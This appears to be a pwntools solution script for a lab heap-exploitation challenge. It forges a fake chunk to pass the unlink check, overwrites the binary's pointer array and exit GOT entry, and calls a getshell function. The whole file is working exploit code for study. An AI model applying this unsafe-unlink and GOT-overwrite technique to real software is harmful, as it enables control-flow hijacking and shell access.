# unlink2.py
from pwn import *
p = process("./unlink_unsafe2")
def add(data):
	print p.sendlineafter(">","1")
	print p.sendlineafter(":",str(data))
def free(idx):
	print p.sendlineafter(">","2")
	print p.sendlineafter(":",str(idx))
def edit(idx, size, data):
	print p.sendlineafter(">","3")
	print p.sendlineafter(":",str(idx))
	print p.sendlineafter(":",str(size))
	print p.sendlineafter(":",str(data))
def exit_func():
	print p.sendlineafter(">","4")

elf = ELF('./unlink_unsafe2')
heap_ptr = elf.symbols['ptr']
shell = elf.symbols['getshell']
exit = elf.got['exit']
third_heap_ptr = heap_ptr+16

log.info("third_heap_ptr : "+hex(third_heap_ptr))

add("AAAA") # 0
add("AAAA") # 1
add("AAAA") # 2
add("AAAA") # 3

payload = p64(0)
payload += p64(0)
payload += p64(third_heap_ptr-24) # P->fd->bk == P
payload += p64(third_heap_ptr-16) # P->bk->fd == P
payload += "A"*0xe0
payload += p64(0x100) # prev_size
payload += p64(0x110) # inuse 0
pause()
edit(2, 0x130, payload)
pause()
free(3)		# unlink!
pause()
payload = p64(0)
payload += p64(exit) # ptr 0
pause()
edit(2, 16, payload)
pause()
edit(0, 8, p64(shell))
exit_func() # getshell
p.interactive()